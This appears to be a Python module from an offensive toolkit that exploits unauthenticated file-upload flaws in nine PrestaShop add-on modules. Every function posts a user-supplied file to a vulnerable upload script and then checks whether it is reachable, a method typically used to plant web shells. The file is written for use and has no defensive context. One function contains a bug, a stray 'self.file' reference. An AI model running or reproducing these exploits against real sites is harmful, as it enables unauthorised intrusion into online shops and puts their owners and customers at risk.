##
## prestashop - file uploaded.
##

from core.misc import printf
import requests

def parse(web):
    if 'http' not in web:
        try:
            requests.get('http://' + web)
            return 'http://' + web
        except:
            return  'https://' + web
    else:
        return  web
def sss_ex(web,file):
    url = parse(web)
    files={'userfile':(file, open(file,'rb'),'multipart/form-data')}
    printf('[+] Simple Slide Show - file uploaded.')
    printf('[+] start uploading files (%s) to (%s)' % (file,url))
    requests.post(url + "/modules/simpleslideshow/uploadimage.php",files=files)
    cek = requests.get(url + '/modules/simpleslideshow/slides/' + file)
    if cek.status_code == 200:
        printf('[+] Files successfully uploaded')
        printf('    => link: %s' % cek.url)
    else:
        printf('[!] Failed to upload files, maybe website is not vulnerable')
def ppa_ex(web,file):
    files={'userfile':(file, open(file,'rb'),'multipart/form-data')}
    url = parse(web)
    printf('[+] Product Page adverts - file uploaded.')
    printf('[+] start uploading files (%s) to (%s)' % (file,url))
    requests.post(url + "/modules/productpageadverts/uploadimage.php",files=files)
    cek = requests.get(url + '/modules/productpageadverts/slides/' + file)
    if cek.status_code == 200:
        printf('[+] Files successfully uploaded')
        printf('    => link: %s' % cek.url)
    else:
        printf('[!] Failed to upload files, maybe website is not vulnerable!')
def hpa_ex(web,file):
    files={'userfile':(file, open(file,'rb'),'multipart/form-data')}
    url = parse(web)
    printf('[+] Home Page Advertise - file uploaded.')
    printf('[+] start uploading files (%s) to (%s)' % (file,url))
    requests.post(url + "/modules/homepageadvertise/uploadimage.php",files=files)
    cek = requests.get(url + "/modules/homepageadvertise/slides/" + self.file)
    if cek.status_code == 200:
        printf('[+] Files successfully uploaded')
        printf('    => link: %s' % cek.url)
    else:
        printf('[!] Failed to upload files, maybe website is not vulnerable!')
def ca_ex(web,file):
    files={'userfile':(file, open(file,'rb'),'multipart/form-data')}
    url = parse(web)
    printf('[+] Column adverts - file uploaded.')
    printf('[+] start uploading files (%s) to (%s)' % (file,url))
    requests.post(url + "/modules/columnadverts/uploadimage.php",files=files)
    cek = requests.get(url + '/modules/columnadverts/slides/' + file)
    if cek.status_code == 200:
        printf('[+] Files successfully uploaded')
        printf('    => link: %s' % cek.url)
    else:
        printf('[!] Failed to upload files, maybe website is not vulnerable!')
def vtem_ex(web,file):
    files={'userfile':(file, open(file,'rb'),'multipart/form-data')}
    url = parse(web)
    printf('[+] vtem slide show - file uploaded.')
    printf('[+] start uploading files (%s) to (%s)' % (file,url))
    requests.post(url + "/modules/vtemslideshow/uploadimage.php",files=files)
    cek = requests.get(url + '/modules/vtemslideshow/slides/' + file)
    if cek.status_code == 200:
        printf('[+] Files successfully uploaded')
        printf('    => link: %s' % cek.url)
    else:
        printf('[!] Failed to upload files, maybe website is not vulnerable!')
def awp_ex(web,file):
    url = parse(web)
    files={'userfile':(file, open(file,'rb'),'multipart/form-data')}
    printf('[+] Attribute wizard pro - file uploaded.')
    printf('[+] start uploading files (%s) to (%s)' % (file,url))
    requests.post(url + "/modules/attributewizardpro/file_upload.php",files=files)
    cek = requests.get(url + '/modules/attributewizardpro/slides/' + file)
    if cek.status_code == 200:
        printf('[+] Files successfully uploaded')
        printf('    => link: %s' % cek.url)
    else:
        printf('[!] Failed to upload files, maybe website is not vulnerable')
def aps_ex(web,file):
    url = parse(web)
    files={'userfile':(file, open(file,'rb'),'multipart/form-data')}
    printf('[+] Additional products tabs - file uploaded.')
    printf('[+] start uploading files (%s) to (%s)' % (file,url))
    requests.post(url + "/modules/additionalproductstabs/file_upload.php",files=files)
    cek = requests.get(url + '/modules/additionalproductstabs/slides/' + file)
    if cek.status_code == 200:
        printf('[+] Files successfully uploaded')
        printf('    => link: %s' % cek.url)
    else:
        printf('[!] Failed to upload files, maybe website is not vulnerable')
def atp_ex(web,file):
    url = parse(web)
    files={'userfile':(file, open(file,'rb'),'multipart/form-data')}
    printf('[+] Add this plugin - file uploaded.')
    printf('[+] start uploading files (%s) to (%s)' % (file,url))
    requests.post(url + "/modules/addthisplugin/file_upload.php",files=files)
    cek = requests.get(url + '/modules/addthisplugin/slides/' + file)
    if cek.status_code == 200:
        printf('[+] Files successfully uploaded')
        printf('    => link: %s' % cek.url)
    else:
        printf('[!] Failed to upload files, maybe website is not vulnerable')
def as_ex(web,file):
    url = parse(web)
    files={'userfile':(file, open(file,'rb'),'multipart/form-data')}
    printf('[+] Addvanced slider - file uploaded.')
    printf('[+] start uploading files (%s) to (%s)' % (file,url))
    requests.post(url + "/modules/advancedslider/file_upload.php",files=files)
    cek = requests.get(url + '/modules/advancedslider/slides/' + file)
    if cek.status_code == 200:
        printf('[+] Files successfully uploaded')
        printf('    => link: %s' % cek.url)
    else:
        printf('[!] Failed to upload files, maybe website is not vulnerable')
